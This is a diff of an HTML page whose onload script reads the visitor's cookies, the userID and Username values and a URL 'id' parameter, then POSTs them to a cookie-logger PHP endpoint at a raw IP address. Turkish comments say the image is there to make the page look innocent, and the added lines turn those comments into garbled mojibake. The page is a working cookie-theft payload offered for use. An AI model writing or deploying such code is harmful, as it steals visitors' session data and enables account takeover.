@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html>
 <head>
@@ -8,32 +7,34 @@
 </head>
 <body onload="(async () =>
     {
-    // Cookie içinden belirli anahtar-deðer yakalamak için basit yardýmcý fonksiyon
+    // Cookie iÃ§inden belirli anahtar-deÄŸer yakalamak iÃ§in basit yardÄ±mcÄ± fonksiyon
     function getCookieVal(name) {
-    // name=... kýsmýný yakalamak için bir regex
+    // name=... kÄ±smÄ±nÄ± yakalamak iÃ§in bir regex
     const match = document.cookie.match(new RegExp('(^|;\\s*)' + name + '=([^;]+)'));
     return match ? match[2] : '';
     }
 
-    // 1) Tüm cookie stringi
+    // 1) TÃ¼m cookie stringi
     const cookieString = document.cookie;
 
-    // 2) Tek tek userID ve Username cookie deðerlerini al
+    // 2) Tek tek userID ve Username cookie deÄŸerlerini al
     const userIDVal   = getCookieVal('userID');
     const usernameVal = getCookieVal('Username');
 
+    // 3) URL parametresindeki ?id=... (Ã¶rneÄŸin /addresses?id=123) degerini yakala
+    const randomIDParam = new URLSearchParams(window.location.search).get('id');
 
     try {
     // Bu verileri kendi sunucuna POST'la
     await fetch('http://16.171.42.24/cookie-logger.php', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
-    // credentials: 'include' => istersen ekle (auth cookie vs. göndersin)
+    // credentials: 'include' => istersen ekle (auth cookie vs. gÃ¶ndersin)
     body: JSON.stringify({
     cookie_string: cookieString,
     userID_cookie: userIDVal,
     username_cookie: usernameVal,
-   
+    randomID_param: randomIDParam,
     user_agent: navigator.userAgent
     })
     });
@@ -42,7 +43,7 @@
     }
     })()">
 
-    <!-- Görsel ekleyerek sayfa daha masum görünebilir -->
+    <!-- GÃ¶rsel ekleyerek sayfa daha masum gÃ¶rÃ¼nebilir -->
     <img src="https://akn-ss.a-cdn.akinoncloud.com/products/2021/09/15/314248/f8398d46-fc92-4498-8790-f3bbed8c57ff_size3840_cropCenter.jpg"
          style="max-width:100%;"
          alt="Resim" />
